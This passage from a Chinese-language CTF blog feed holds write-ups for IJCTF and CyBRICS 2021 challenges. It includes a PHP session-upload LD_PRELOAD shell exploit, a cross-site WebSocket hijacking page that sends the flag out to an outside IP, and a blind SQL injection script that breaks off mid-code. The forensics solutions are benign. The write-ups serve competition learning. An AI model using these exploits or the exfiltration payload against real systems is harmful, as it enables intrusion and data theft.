class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Exploit</span></span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://8.136.8.210:10030&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;base_uri&quot;</span> =&gt; <span class="variable">$URL</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span> =&gt; <span class="number">3.0</span></span><br><span class="line">));</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$client</span>-&gt;post(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;chance&quot;</span> =&gt; <span class="string">&quot;for(;;)&#123;&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span> =&gt; <span class="string">&quot;chance&quot;</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;multipart&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;N&quot;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;file&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; Psr7\Utils::tryFopen(<span class="string">&quot;./shell.so&quot;</span>, <span class="string">&quot;rb&quot;</span>),</span><br><span class="line">                <span class="string">&quot;filename&quot;</span> =&gt; <span class="string">&quot;shell.so&quot;</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;headers&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="string">&quot;PHPSESSID=exp1;&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;bonus&quot;</span> =&gt; <span class="string">&quot;/var/lib/php/sessions/sess_exp1&quot;</span></span><br><span class="line">    )</span><br><span class="line">));</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line"><span class="variable">$content</span> = str_replace(<span class="string">&quot;Welcome!!upload_progress_N|&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$tmpLibName</span> = unserialize(<span class="variable">$content</span>)[<span class="string">&quot;files&quot;</span>][<span class="number">0</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$tmpLibName</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$client</span>-&gt;post(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;chance&quot;</span> =&gt; <span class="string">&#x27;for(;;)&#123;&#125;&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;mode&quot;</span> =&gt; <span class="string">&quot;chance&quot;</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;multipart&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;&lt;?php putenv(\&quot;LD_PRELOAD=<span class="subst">$tmpLibName</span>\&quot;); mail(\&quot;\&quot;, \&quot;\&quot;, \&quot;\&quot;, \&quot;\&quot;); ?&gt;&quot;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;file&quot;</span>,</span><br><span class="line">                <span class="string">&quot;contents&quot;</span> =&gt; <span class="string">&quot;none&quot;</span>,</span><br><span class="line">                <span class="string">&quot;filename&quot;</span> =&gt; <span class="string">&quot;none.so&quot;</span></span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;headers&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span> =&gt; <span class="string">&quot;PHPSESSID=exp2;&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="string">&quot;/&quot;</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;query&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;bonus&quot;</span> =&gt; <span class="string">&quot;/var/lib/php/sessions/sess_exp2&quot;</span></span><br><span class="line">        )</span><br><span class="line">    ));</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到 shell 后执行根目录下的 flag 文件即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ijctf&#123;the_memories_from_the_past&#125;</span><br></pre></td></tr></table></figure><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Riddle-Joker"><a href="#Riddle-Joker" class="headerlink" title="Riddle Joker"></a>Riddle Joker</h3><blockquote><p>Joker has returned from his imprisonment. Rumour says that he’s scheming a new evil operation by implanting several bombs at a local bank. Each of bomb has a tag information that might be a clue for finding Joker’s secret.</p><p>Author: <code>Avilia#1337</code></p></blockquote><p>将附件中的 PDF 文件用 010 Editor 打开，可以发现在 690 流的地方有一个嵌入文件。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">78 9C 0B F0 66 66 11 61 66 64 60 60 F0 6C FB 12</span><br><span class="line">B4 5C 22 90 C5 04 C8 D6 00 62 0E 20 4E CB 49 4C</span><br><span class="line">D7 2B A9 28 39 51 29 77 66 1E AF 6A DC E6 3D A7</span><br><span class="line">E7 88 76 0A 88 AD FA 22 BA EC D9 FD D6 FB 79 75</span><br><span class="line">91 1A BF 2A E6 3F 2F BF D0 D3 3C C3 AE 68 95 CD</span><br><span class="line">DA 3B 8D 9F 5E 2E 6A 7F D7 7E FB 41 80 37 23 93</span><br><span class="line">3D 33 2E B3 55 18 20 40 A1 61 4B 23 03 92 4D 5C</span><br><span class="line">0C 0A 60 71 46 06 09 86 86 4B 0C 4B 7D 6A AF 33</span><br><span class="line">A2 D3 01 DE AC 6C 10 35 8C 0C 51 40 3A 0A AC 03</span><br><span class="line">00 B9 35 3B 19</span><br></pre></td></tr></table></figure><p>将其用 zlib 解压一次可以发现是一个压缩文档，其中包含带密码的 flag.txt。在 PDF 文件中能发现很多 xref，还有 imagemagick 的标识，猜测其中有很多张图片，同时可以发现 Coordinate 的字样，可以发现许多坐标。通过搜索可以发现如下参考文档，使用其中的工具构造如下脚本还原图片。</p><blockquote><p><a href="https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/">https://blog.didierstevens.com/2008/05/07/solving-a-little-pdf-puzzle/</a></p><p><a href="https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/">https://blog.didierstevens.com/2021/01/31/new-tool-pdftool-py/</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">500</span>, <span class="number">500</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    os.system(<span class="string">f&quot;python3 pdftool.py iu secret.pdf -s<span class="subst">&#123;x&#125;</span> -d &gt; tmp.pdf&quot;</span>)</span><br><span class="line">    x, y = os.popen(<span class="string">f&quot;exiftool -Coordinate tmp.pdf&quot;</span>).read().split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>].strip().split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;x&#125;</span>, <span class="subst">&#123;y&#125;</span> image&quot;</span>)</span><br><span class="line">    os.system(<span class="string">f&quot;convert tmp.pdf -colorspace RGB tmp.png&quot;</span>) <span class="comment"># imagemagick</span></span><br><span class="line">    smallImage = Image.<span class="built_in">open</span>(<span class="string">&quot;tmp.png&quot;</span>)</span><br><span class="line">    image.paste(smallImage, (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)))</span><br><span class="line">    smallImage.close()</span><br><span class="line">image.save(<span class="string">&quot;this.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下二维码图片。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627385844898360/411d16e19dfc8033c510d77994c0a67e59a61c02.png@100w"></p><p>使用工具读取该二维码内容可得如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The passcode is sup3r__cred3nti4l_p4sscode_3da748</span><br></pre></td></tr></table></figure><p>使用 <code>sup3r__cred3nti4l_p4sscode_3da748</code> 解压压缩文档可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;4bbffb87ecc31ba242772ab1f14f569c&#125;</span><br></pre></td></tr></table></figure><h3 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h3><blockquote><p>A robber broke into a our vault in the middle of night. There’s an indication that the robber tried to steal some items which are considered as a confidential asset. Could you figured it out?</p><p>Flag format: <code>IJCTF&#123;[a-f0-9]&#123;32&#125;&#125;</code></p><p>Author: <code>Avilia#1337</code></p><p>When incident happened, the attacker got into our <code>IP over ICMP</code> tunnel network to access <code>HTTP/2</code> web-server with <code>SSL</code> enabled</p><p>Even so, our captured logs aren’t precise enough. Each packet has an unusual timestamp and it’s kinda messsy…</p></blockquote><h4 id="流量包处理"><a href="#流量包处理" class="headerlink" title="流量包处理"></a>流量包处理</h4><p>根据提示可知流量包中的流量的时间戳有些问题，因此可以使用 Wireshark 自带的工具先对流量进行排序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reordercap</span> log.pcap log_ordered.pcap</span><br></pre></td></tr></table></figure><p>对排好序的流量包进行分析，可以发现大部分都是 ICMP 流量，还有一些是 IPv4 的数据。对其进行分析可以发现两个 IPv4 中夹杂着一段数据，搜寻之后可以找到一个用于使用 ICMP 进行通讯的工具 Hans。尝试将 Hans 插入的数据删除，恢复原本的结构。</p><blockquote><p><a href="https://github.com/friedrich/hans">https://github.com/friedrich/hans</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627393585872788/6d42abe0873a356c246805386df413313aa7304c.png"></p><blockquote><p><a href="https://www.wireshark.org/docs/man-pages/editcap.html">https://www.wireshark.org/docs/man-pages/editcap.html</a></p></blockquote><p>使用 Wireshark 的 editcap 工具对数据进行编辑，删除 Hans 插入的 33 个字节数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$editcap</span> -C 15:33 .\log_ordered.pcap .\log_processed.pcap</span><br></pre></td></tr></table></figure><p>打开处理好的流量包，可以发现一些 Socks 和 TCP 流量，根据提示将 Socks 流量重新设置解码为 TLS。跟踪 TCP 流到 0 可以发现传输的 SSL Key Log file。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/18ff2c8d-887e-4d48-be34-2307c5249467/1627394559649768/b9ac84b81dcff4e6d1cedebd96b2f292301a210d.png"></p><p>将其导出后保存为文件，将部分换行符修正为空格，导入到 Wireshark 中解密 TLS 流量。</p><h4 id="HTTP2-流量的分析"><a href="#HTTP2-流量的分析" class="headerlink" title="HTTP2 流量的分析"></a>HTTP2 流量的分析</h4><p>解密的 TLS 流量中有很多含有 data 和 content-range 的数据传输。将 SSL Key Log file 注入进文件中。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$editcap</span> --inject-secrets tls,sslkeylogfile log_processed.pcap log_decrypted.pcap</span><br></pre></td></tr></table></figure><p>将流量中含有的 data 和对应部分的 range 取出，使用如下的 CyberChef  Receipt 处理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tshark</span> -r ./log_decrypted.pcap -Y <span class="string">&quot;http2&quot;</span> -T fields -e http2.headers.range -e http2.data.data &gt; data.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;^(bytes.*)\\n&#39;&#125;,&#39;$1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t\\n|bytes&#x3D;&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;\\t\\t|-&#39;&#125;,&#39;,&#39;,true,false,true,false)</span><br></pre></td></tr></table></figure><p>将得到的数据使用 Excel 对两位和四位长度的数据分别排序后导出，再 <code>From Hex</code> 处理一次可以得到一个字符串 <code>0edbca2531daefac9c5c84c016792713fd23681ea8bc1b3d088b617f75940313</code> 和一个压缩包。使用该字符串作为压缩包的密码将其解压可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IJCTF&#123;aa51f2cc8eaf466a277da70db3a3c576&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/603682ab.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>7th XCTF &amp; CyBRICS CTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/aeac0311.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/aeac0311.html</guid>
      <pubDate>Thu, 29 Jul 2021 16:11:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h2 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&quot;Ad-Network&quot;&gt;&lt;a href=&quot;#Ad-Network&quot; class=&quot;headerlink&quot; title=&quot;Ad Network&quot;&gt;&lt;/a&gt;Ad Network&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Author: Alexander Menshchikov (&lt;a href=&quot;https://t.me/n0str&quot;&gt;@n0str&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;We are so tired of advertising on</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ad-Network"><a href="#Ad-Network" class="headerlink" title="Ad Network"></a>Ad Network</h3><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)</p><p>We are so tired of advertising on the internet. It feels like it breaks the internet. Try to follow the ad, try to follow its rules.</p><p>There is a flag 1337 redirects deep into the network…</p></blockquote><p><code>/adnetwork</code> 下有重定向，次数大概为 1337 次，构造出如下脚本来获得 flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://adnetwork-cybrics2021.ctf.su/adnetwork&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;timeout&quot;</span> =&gt; <span class="number">15</span>,</span><br><span class="line">    <span class="string">&quot;allow_redirects&quot;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;verify&quot;</span> =&gt; <span class="literal">false</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">1338</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="variable">$client</span>-&gt;get(<span class="variable">$URL</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;proxy&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;http&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;https&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1:7890&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ));</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[i--] <span class="subst">$e</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span>--;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$response</span>-&gt;getBody()-&gt;getContents();</span><br><span class="line">    <span class="variable">$URL</span> = str_replace(<span class="string">&quot;\&quot;&gt;See Other&lt;/a&gt;.\n\n&quot;</span>, <span class="string">&quot;&quot;</span>, str_replace(<span class="string">&quot;&lt;a href=\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$content</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[<span class="subst">$i</span>] &quot;</span> . <span class="variable">$URL</span> . PHP_EOL;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$content</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;f0lL0w_RUl3Z_F0ll0W_r3d1r3C7z&#125;</span><br></pre></td></tr></table></figure><h3 id="Multichat"><a href="#Multichat" class="headerlink" title="Multichat"></a>Multichat</h3><blockquote><p>Author: Alexander Menshchikov (<a href="https://t.me/n0str">@n0str</a>)</p><p>Yet another chat-messenger with rooms support! Free to use. Convince the admin that its code is insecure.</p><p>Tip: Admin and tech support are members of a secret chat room. Tech support can ask admin to tell him the flag, to do that tech support writes him a message (in a chat): “<code>Hey, i forgot the flag. Can you remind me?</code>“. Then admin will tell him the flag.</p></blockquote><p>基于 WebSocket 的聊天室，根据题目描述，只需要技术员向管理员发送指定字符串即可接收到 flag。在 5000 端口给了一个上报 URL 的页面。因此，只需要构建一个前端页面进行 CSRF 即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            socket.onopen = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                socket.send(<span class="string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="javascript">            socket.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> exportFlag = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">                exportFlag.open(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;http://8.136.8.210:3255/flagis-&#x27;</span> + <span class="built_in">window</span>.btoa(e.data));</span></span><br><span class="line">                exportFlag.send();</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将页面放在自己的服务器上，提交给靶机，可在监听的端口处得到如下响应。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627146665815106/cc0e33635d5c036ca114db256c8ece558677e3d2.jpg"></p><p>将其中带出的信息解码可得如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sure, dude. The flag is cybrics&#123;Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Pwn3d_CR055_51t3_W3850CK3t_h1jACK1n9&#125;</span><br></pre></td></tr></table></figure><h3 id="Announcement"><a href="#Announcement" class="headerlink" title="Announcement"></a>Announcement</h3><blockquote><p>Author: Alexander Menshchikov (@n0str)</p><p>Ladies and gentlemen!</p><p>Allow us to introduce a brand new project —<br>⚐ The Flag</p></blockquote><p>在提交的参数中 SQL 注入，其中 <code>digest</code> 参数的值需为 <code>email</code> 的 MD5。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/638458dd-4c5a-4116-95aa-da2199cd24a8/1627147306218176/cf696473812c358ea52022ff8ccbbc179861027a.png"></p><p>写脚本构造报错逻辑进行盲注。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;../vendor/autoload.php&#x27;</span>;</span><br><span class="line"><span class="variable">$URL</span> = <span class="string">&quot;http://announcement-cybrics2021.ctf.su/&quot;</span>;</span><br><span class="line"><span class="comment">//$statement = &quot;select database()&quot;; //announcement</span></span><br><span class="line"><span class="comment">//$statement = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;; //emails,logs</span></span><br><span class="line"><span class="comment">//$statement = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database()&quot;; //email,id,timestamp,log</span></span><br><span class="line"><span class="variable">$statement</span> = <span class="string">&quot;select group_concat(log) from announcement.logs&quot;</span>; <span class="comment">//flag</span></span><br><span class="line"><span class="variable">$text</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> Client(<span class="keyword">array</span>(</span><br><span class="line">  